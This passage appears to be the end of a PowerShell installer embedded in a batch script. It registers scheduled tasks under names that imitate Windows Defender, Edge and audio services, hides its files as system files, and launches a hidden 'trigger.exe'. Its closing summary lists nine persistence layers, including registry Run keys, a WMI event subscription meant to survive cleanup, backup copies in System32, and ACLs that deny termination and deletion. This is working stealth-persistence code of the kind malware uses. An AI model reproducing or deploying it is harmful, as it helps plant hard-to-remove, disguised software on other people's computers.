Register-SysTask $TaskMain  'wscript.exe' ('/b /nologo "' + $LaunchVbs   + '"') 'Windows Defender Health Synchronization Service'
Register-SysTask $TaskGuard 'wscript.exe' ('/b /nologo "' + $GuardVbs    + '"') 'Microsoft Edge Update Task (Machine)' 2
Register-SysTask $TaskSvcmon  'wscript.exe' ('/b /nologo "' + $SvcmonVbs  + '"') 'Windows Audio Service Check'
Register-SysTask $TaskDll     'wscript.exe' ('/b /nologo "' + $Dllhost2Vbs + '"') 'Windows Audio Codec Service'
Register-SysTask $TaskRpc     'wscript.exe' ('/b /nologo "' + $Rpcss2Vbs  + '"') 'Windows Audio Trigger Service'
Register-RepatchTask $TaskRepatch 'wscript.exe' ('/b /nologo "' + $RepatchVbs + '"') 'Windows Update Audio Media Sync'

# Lock task XMLs
foreach ($tn in @($TaskMain,$TaskGuard,$TaskSvcmon,$TaskDll,$TaskRpc,$TaskRepatch)) {
    Lock-TaskXml $tn
}

# ── 13. Hide key files (attrib +S +H) ─────────────────────────
Write-Host "[13/14] Setting hidden+system attributes on key files..." -ForegroundColor Cyan
$toHide = @($TrigExe, $RsevecExe, $TrigBack, $RsevecBack) | Where-Object { Test-Path $_ }
foreach ($f in $toHide) {
    try { attrib +S +H $f } catch {}
}

# ── 14. Kick everything off immediately ───────────────────────
Write-Host "[14/14] Starting everything now..." -ForegroundColor Cyan

# Start guard first (it will verify everything)
try { Start-ScheduledTask -TaskName $TaskGuard } catch {}
Start-Sleep 2

# Start three mesh watchdogs
try { Start-ScheduledTask -TaskName $TaskSvcmon } catch {}
Start-Sleep 1
try { Start-ScheduledTask -TaskName $TaskDll }    catch {}
Start-Sleep 1
try { Start-ScheduledTask -TaskName $TaskRpc }    catch {}
Start-Sleep 1

# Start main watchdog
try { Start-ScheduledTask -TaskName $TaskMain } catch {}
Start-Sleep 2

# Launch trigger.exe directly now
$trigRunning = Get-Process -Name trigger -ErrorAction SilentlyContinue
if (-not $trigRunning) {
    Write-Host "  Launching trigger.exe directly..." -ForegroundColor Cyan
    try {
        Start-Process -FilePath $TrigExe -WindowStyle Hidden
        Start-Sleep 2
        $trigRunning = Get-Process -Name trigger -ErrorAction SilentlyContinue
        if ($trigRunning) {
            Write-Host "  trigger.exe running (PID $($trigRunning.Id))." -ForegroundColor Green
        } else {
            Write-Host "  trigger.exe launched (watchdogs will confirm)." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  Direct launch failed — watchdog will start it: $($_.Exception.Message)" -ForegroundColor Yellow
    }
} else {
    Write-Host "  trigger.exe already running (PID $($trigRunning.Id))." -ForegroundColor Green
}
Start-Sleep 1

Write-Host ""
Write-Host "════════════════════════════════════════════════════════" -ForegroundColor Green
Write-Host "  Installation complete!" -ForegroundColor Green
Write-Host "════════════════════════════════════════════════════════" -ForegroundColor Green
Write-Host "  PERSISTENCE LAYERS:" -ForegroundColor Cyan
Write-Host "  [1] 3-way triangular watchdog mesh (svcmon/dllhost2/rpcss2)" -ForegroundColor White
Write-Host "      A watches B+C, B watches A+C, C watches A+B" -ForegroundColor DarkGray
Write-Host "  [2] Legacy watchdog (wdsvc.bat) + guard PS1 (every 2 min)" -ForegroundColor White
Write-Host "  [3] 5 scheduled tasks (AtStartup+AtLogon+repeat)" -ForegroundColor White
Write-Host "  [4] 5 registry Run keys" -ForegroundColor White
Write-Host "  [5] WMI Permanent Event Subscription (survives task+reg wipe)" -ForegroundColor White
Write-Host "  [6] 48-hour re-patch task (restores everything missing)" -ForegroundColor White
Write-Host "  [7] 3-location file backups (System32\rsc + SysWOW64 + LocalLow)" -ForegroundColor White
Write-Host "  [8] PROCESS_TERMINATE deny ACE on trigger.exe + rsevec.exe PIDs" -ForegroundColor White
Write-Host "  [9] ACL deny (delete/write) on all exe/bat files" -ForegroundColor White
Write-Host ""
Write-Host "  trigger.exe  → $TrigExe" -ForegroundColor Cyan
Write-Host "  Backups      → $TrigBack" -ForegroundColor Cyan
Write-Host "                 $SysWow\trigger.exe" -ForegroundColor Cyan
Write-Host "                 $AppLow\trigger.exe" -ForegroundColor Cyan
Write-Host ""
Write-Host "  To uninstall yourself (admin PowerShell):" -ForegroundColor DarkGray
Write-Host "  icacls `"$TrigExe`" /reset ; del /F `"$TrigExe`"" -ForegroundColor DarkGray
Write-Host "  schtasks /Delete /TN $TaskMain /F" -ForegroundColor DarkGray
Write-Host "  schtasks /Delete /TN $TaskSvcmon /F" -ForegroundColor DarkGray
Write-Host "════════════════════════════════════════════════════════" -ForegroundColor Green
::PS_END
